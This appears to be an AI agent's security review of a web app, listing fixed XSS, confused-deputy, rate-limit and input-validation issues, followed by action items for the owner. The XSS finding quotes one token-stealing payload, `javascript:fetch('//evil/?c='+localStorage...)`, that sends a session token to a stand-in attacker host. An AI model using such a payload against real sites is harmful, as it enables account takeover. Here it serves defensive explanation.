# Lawnn — Security Review & Hardening

_Date: 2026-06-10 · Scope: full codebase (Express/Prisma backend, Socket.io, React/Vite frontend). Changes applied locally only — not committed or pushed._

## Summary

The codebase was in reasonable shape on the fundamentals: bcrypt (12 rounds), JWT verification with no insecure fallback, parameterised Prisma queries (no SQL injection surface), role checks on privileged routes, helmet, CORS allowlist, atomic escrow transactions, and consistent ownership checks (`isParticipant`, `sellerId`, `clientId`). React's default escaping means there is no `dangerouslySetInnerHTML` and no classic DOM-XSS sink.

The most serious issue was **stored XSS via attacker-controlled URL fields**, plus a **confused-deputy endpoint** that could sign reads for arbitrary private files. Both are now fixed, along with several hardening improvements. Two items remain that only you can complete (credential rotation and a dependency scan) because they need database access / the shell.

## Findings and fixes

### HIGH — Stored XSS through unvalidated URL fields → account takeover
Multiple models stored a URL straight from the request body and the UI later rendered it as an `<a href>`, `<img src>`, or CSS `background-image`: job attachments, application files, feed `imageUrl`, marketplace `fileUrl`, profile `avatar` / portfolio `imageUrl` / `pdfUrl`, client-profile `logo`, and chat message `fileUrl`. A value such as `javascript:fetch('//evil/?c='+localStorage.lawnn_token)` persisted on a job attachment would execute in any viewer's session when clicked. Because the JWT lives in `localStorage`, this is a full account-takeover primitive.

Fix: added `backend/src/lib/sanitize.js` with `safeUrl()`, which accepts only absolute `http(s)` URLs or scheme-less storage paths and drops anything carrying an executable scheme or a protocol-relative prefix. It is now applied at every write point listed above (`jobs.js`, `feed.js`, `marketplace.js`, `profiles.js`, `socket.js`). Defense-in-depth was also added on the frontend: the job-attachment anchor in `App.jsx` only emits an `href` when the stored value is `http(s)`.

### HIGH/MEDIUM — Confused-deputy: `POST /uploads/sign-read`
Any authenticated user could mint a short-lived signed read URL for **any** path in the private bucket, bypassing the per-resource authorization that `jobs.js` performs before exposing application files. The endpoint's own comment flagged the risk, and the frontend never used it.

Fix: removed the public endpoint. The internal `signPrivateRead()` helper is retained and is only ever called from routes that have already verified the caller may see the file.

### MEDIUM — No baseline rate limiting
Only `/auth/login`, `/auth/register`, and `/auth/accept-invite` were limited. Object-ID enumeration, offer/notification spam, and upload-sign abuse were unbounded.

Fix: added a generous global limiter (600 requests / 15 min / IP) in `index.js`, on top of the existing strict auth limiter. `trust proxy` is already set for correct client IPs behind Render/Cloudflare.

### MEDIUM — Negative / NaN numeric inputs
`budget` and `price` were coerced with `parseInt(...) || 0`, allowing negatives (a negative project budget flows into a wallet `increment`) and NaN (which crashes the Prisma `Int` column with a 500).

Fix: `nonNegativeInt()` validates and floors these; invalid values now return 400. (Marketplace offer `amount` was already validated as positive.)

### LOW — Socket.io CORS treated the origin list as one literal string
`origin: process.env.FRONTEND_URL` passed the whole comma-separated value as a single origin, so multi-origin setups would silently fail to match. Aligned it with the REST layer's parsed allowlist.

### LOW — No fail-fast on a missing/weak `JWT_SECRET`
The app would boot with an unset or trivially short secret. Added a startup guard that refuses to boot unless `JWT_SECRET` is at least 32 characters.

## Verified as already safe (no change needed)
- No SQL injection: all DB access goes through Prisma with bound parameters.
- News article bodies render as JSX text (auto-escaped), not raw HTML.
- The client-profile website link already neutralises non-`http(s)` schemes on render.
- Ownership/role checks are present and derive identity from the verified JWT, not request-body claims (notably `conversations.js`, which explicitly ignores client-supplied roles).
- Passwords are never returned (`safeUser` / explicit `select`), and invite tokens are stored only as SHA-256 hashes with TTLs.

## Action items for you (need DB access / shell — I can't do these here)

1. **Rotate the leaked `yomna@lawnndesign.com` credential.** Per the handoff it was committed in source history and flagged by GitGuardian. Delete or rotate the account in the DB (Admin → Users), then optionally purge it from git history with `git filter-repo` + force-push. Rotation is the real fix; history-scrub is hygiene.
2. **Run a dependency scan.** I couldn't run `npm audit` (sandbox didn't start). Run `npm audit` in both the repo root and `backend/`, and update anything flagged.
3. **Confirm `backend/.env` is untracked.** It should be covered by the root `.gitignore` (`.env`), but verify with `git ls-files backend/.env` (expect empty output) and confirm no real secrets ever landed in history.

## Recommended next (architectural, not applied)
- Consider moving the JWT from `localStorage` to an httpOnly, Secure, SameSite cookie. With the XSS sinks closed this risk is much reduced, but a cookie removes the script-readable-token primitive entirely.
- Add a Content-Security-Policy header on the Cloudflare Pages frontend (hosting config) to further constrain script/connect sources.
- Consider shortening the 7-day JWT lifetime and adding token revocation if you need to force logout.
